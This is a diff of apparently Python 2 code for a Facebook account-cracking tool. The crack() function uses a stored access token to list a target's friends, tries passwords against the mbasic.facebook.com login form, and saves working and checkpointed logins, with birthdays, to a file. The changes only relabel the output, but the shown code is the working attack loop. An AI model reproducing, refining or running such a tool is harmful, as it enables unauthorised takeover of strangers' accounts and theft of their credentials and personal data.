@@ -184,14 +184,14 @@ def crack():
 	try:
 		token = open('login_r.txt', 'r').read()
 	except IOError:
-		print' [?] invalid token '
+		print' [!] invalid token '
 		tokenz()
-	ra_id = raw_input(" [\x1b[101m\x1b[1;97m-\x1b[0m] ID Public : ")
+	ra_id = raw_input(" [\x1b[101m\x1b[1;97m?\x1b[0m] ID Public : ")
 	try:
 		pok = requests.get("https://graph.facebook.com/"+ra_id+"?access_token="+token)
 		sp = json.loads(pok.text)
 	except KeyError:
-		jalan(' [?] Id not found ')
+		jalan(' [!] Id not found ')
 	r = requests.get("https://graph.facebook.com/"+ra_id+"/friends?access_token="+token)
 	z = json.loads(r.text)
 	for i in z["data"]:
@@ -232,9 +232,9 @@ def crack():
 				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': rax_x, 'pass': pw, 'login': 'submit'}, headers={'user-agent': rafi_ua})
 				xo = rex.content
 				if 'mbasic_logout_button' in xo or 'save-device' in xo:
-					print('\r  \x1b[1;92m[RAKA_AMANDA] ' +rax_x+ '|' + pw + '       ',']-==')
+					print('\r  ==-[ ' +rax_x+ '|' + pw + '       ',']-==')
 					ok.append(rax_x+'|'+pw)
-					save.write('  [RAKA_AMANDA] '+str(rax_x)+'|'+str(pw)+'\n')
+					save.write('  [ OK ] '+str(rax_x)+'|'+str(pw)+'\n')
 					save.close()
 					break
 					continue
@@ -245,17 +245,17 @@ def crack():
 						data = s.get(url).json()
 						tgllhr = data['birthday'].replace("/","-")
 						nama = data['name']
-						print('\r  \x1b[1;96m[RAKA_AMANDA] ' +rax_x+ '|' + pw + '|' + tgllhr)
-						cp.append(rax_x+'|'+pw+'|'+tgllhr)
-						save.write('  [RAKA_AMANDA] '+str(rax_x)+'|'+str(pw)+'|'+tgllhr+'\n')
+						print('\r  \x1b[1;96m[ CP ] ' +rax_x+ ' <-> ' + pw + ' <-> ' + tgllhr)
+						cp.append(rax_x+' <-> '+pw+' <-> '+tgllhr)
+						save.write('  [ CP ] '+str(rax_x)+' <-> '+str(pw)+' <-> '+tgllhr+'\n')
 						save.close()
 						break
 					except(KeyError, IOError):
 						tgllhr = " "
 					except:pass
-					print('\r  \x1b[1;96m[RAKA_AMANDA] ' +rax_x+ '|' + pw + '|' + tgllhr)
+					print('\r  \x1b[1;96m [ CP ] ' +rax_x+ ' <-> ' + pw + '       ')
 					cp.append(rax_x+'|'+pw)
-					save.write('  [RAKA_AMANDA] '+str(rax_x)+'|'+str(pw)+'|'+tgllhr+'\n')
+					save.write('  [ CP ] '+str(rax_x)+' <-> '+str(pw)+'\n')
 					save.close()
 					break
 					continue
